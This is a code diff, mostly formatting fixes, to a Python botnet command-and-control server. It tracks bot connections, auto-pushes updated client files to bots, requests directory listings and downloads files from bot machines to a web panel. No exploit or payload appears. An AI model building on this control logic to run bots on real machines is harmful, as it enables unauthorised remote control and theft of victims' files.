@@ -5,15 +5,14 @@ from threading import Thread, Condition
 from threading import Lock
 import select
 
-
 try:
     from server import formatsock, server
 except:
     import formatsock
     import server
 
-
 MIN_CLIENT_VERSION = "0.2"
+
 
 class BotNet(Thread):
     INPUT_TIMEOUT = 1
@@ -80,6 +79,7 @@ class BotNet(Thread):
                     filestream = {}
                     fileclose = []
 
+
                     if BotNet.STDOUT_JSON in jsonobj:
                         out = jsonobj[BotNet.STDOUT_JSON].rstrip()
                     if BotNet.STDERR_JSON in jsonobj:
@@ -92,6 +92,10 @@ class BotNet(Thread):
                         fileclose = jsonobj[BotNet.FILECLOSE_JSON]
 
                     print(special)
+                    # TODO: refactor to be called 'finder' or 'ls' not special. I had to separate it as a result of js file issues
+                    self.socketio.emit('finder',
+                                       {'special': special},
+                                       namespace="/bot")
 
                     # Forward stdout/stderr... as needed
                     self.socketio.emit('response',
@@ -104,10 +108,10 @@ class BotNet(Thread):
                     # Forward file bytes as needed
                     for filename in filestream.keys():
                         filebytes = filestream[filename].encode('UTF-8')
-                        self.filemanager.appendBytesToFile(user,filename,filebytes)
+                        self.filemanager.appendBytesToFile(user, filename, filebytes)
 
                     for filename in fileclose:
-                        self.filemanager.closeFile(user,filename)
+                        self.filemanager.closeFile(user, filename)
 
                 except IOError:
                     # Connection was interrupted
@@ -152,9 +156,9 @@ class BotNet(Thread):
     def startFileDownload(self, user, filename):
         with self.connlock:
             if user in self.allConnections:
-                self.filemanager.clearFile(user,filename)
+                self.filemanager.clearFile(user, filename)
                 self.allConnections[user].startFileDownload(filename)
-                return self.filemanager.getFileGenerator(user,filename)
+                return self.filemanager.getFileGenerator(user, filename)
             return None
 
     def requestLs(self, user, filename):
@@ -164,7 +168,6 @@ class BotNet(Thread):
 
     def getFileManager(self):
         return self.filemanager
-
 
 
 class BotServer(Thread):
@@ -189,12 +192,13 @@ class BotServer(Thread):
             bot = Bot(clientsock, host_info, self.socketio)
             if botversion < self.clientversion:
                 # Autoupdate
-                print("[*] Updating {} on version {}".format(user,botversion))
-                bot.sendClientFile(open(self.clientfile,'rb'))
+                print("[*] Updating {} on version {}".format(user, botversion))
+                bot.sendClientFile(open(self.clientfile, 'rb'))
             else:
                 print("[+] Received connection from {}".format(user))
                 self.botnet.addConnection(user, bot)
                 self.socketio.emit('connection', {'user': user}, namespace='/bot')
+
 
 class Bot:
     FILE_SHARD_SIZE = 4096
@@ -239,7 +243,7 @@ class Bot:
         t.start()
 
     def sendClientFile(self, fileobj):
-        self.sendFile(None,fileobj)
+        self.sendFile(None, fileobj)
 
     def __sendFileHelper(self, fileobj, filename=None):
         with self.botlock:
@@ -249,7 +253,7 @@ class Bot:
                     bytestr = dat.decode('UTF-8')
                     if filename:
                         # Particular file
-                        json_str = json.dumps({Bot.FILE_STREAM:bytestr,Bot.FILE_FILENAME:filename})
+                        json_str = json.dumps({Bot.FILE_STREAM: bytestr, Bot.FILE_FILENAME: filename})
                     else:
                         # Client file
                         json_str = json.dumps({Bot.CLIENT_STREAM: bytestr})
@@ -261,17 +265,19 @@ class Bot:
                     json_str = json.dumps({Bot.CLIENT_CLOSE: True})
                 self.sock.send(json_str)
                 fileobj.close()
-                self.socketio.emit('success', {'user': self.user, 'message': "File upload successful"}, namespace='/bot')
+                self.socketio.emit('success', {'user': self.user, 'message': "File upload successful"},
+                                   namespace='/bot')
 
     def startFileDownload(self, filename):
         with self.botlock:
-            json_str = json.dumps({Bot.FILE_DOWNLOAD:filename})
+            json_str = json.dumps({Bot.FILE_DOWNLOAD: filename})
             self.sock.send(json_str)
 
     def requestLs(self, filename):
         with self.botlock:
             json_str = json.dumps({Bot.LS_JSON: filename})
             self.sock.send(json_str)
+
 
 class BotNetFileManager:
     # TODO: change to separate locks for each file
@@ -282,7 +288,8 @@ class BotNetFileManager:
         self.cond = Condition(self.lock)
 
     def getFileGenerator(self, user, filename):
-        uf = (user,filename)
+        uf = (user, filename)
+
         def filegen():
             with self.lock:
                 # While there's something left and it's not closed
@@ -290,15 +297,16 @@ class BotNetFileManager:
                 while uf not in self.closed or len(self.files[uf]) > 0:
                     # Wait until closed or something to write
                     # Therefore: exits wait if closed or nonempty buffer
-                    while (uf not in self.files or len(self.files[uf])==0) and uf not in self.closed:
+                    while (uf not in self.files or len(self.files[uf]) == 0) and uf not in self.closed:
                         self.cond.wait()
                     if len(self.files[uf]) > 0:
                         temp = self.files[uf]
                         self.files[uf] = b''
-                        print("Yielding ",temp)
+                        print("Yielding ", temp)
                         yield temp
                 print("Done yielding")
                 self.closed.remove(uf)
+
         return filegen()
 
     def appendBytesToFile(self, user, filename, wbytes):
@@ -306,7 +314,7 @@ class BotNetFileManager:
         with self.lock:
             if uf not in self.files:
                 self.files[uf] = b''
-            print("Appending ",wbytes)
+            print("Appending ", wbytes)
             self.files[uf] += wbytes
             self.cond.notify()
 
